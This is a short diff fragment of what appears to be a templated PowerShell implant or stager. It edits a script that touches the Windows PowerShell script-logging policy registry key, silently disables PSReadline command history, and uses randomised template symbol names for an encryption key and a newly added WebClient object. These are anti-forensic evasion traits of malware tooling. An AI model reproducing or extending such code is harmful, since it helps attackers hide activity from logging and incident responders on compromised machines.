@@ -12,6 +12,7 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
 
 $GLOBAL_KEY = ${{symbol_name("global_key")}}
+$WebClient = ${{symbol_name("web_client")}}
 
 function Encrypt-AES {
     param(
